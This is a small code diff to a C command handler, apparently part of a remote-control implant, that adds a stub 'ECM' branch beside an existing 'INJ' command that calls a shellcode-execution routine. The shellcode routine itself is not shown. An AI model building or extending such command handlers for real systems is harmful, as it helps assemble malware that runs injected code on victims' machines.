@@ -18,6 +18,9 @@ LPCSTR HandleCommand(LPCSTR command){
 	else if(strstr(command,"INJ") != NULL){
 		return ExecuteShellcode();
 	}
+	else if(strstr(command,"ECM") != NULL){
+		return "OUTPUT OF COMMANDDDD";
+	}
 
 	return "ERROR HANDLING COMMAND";
 
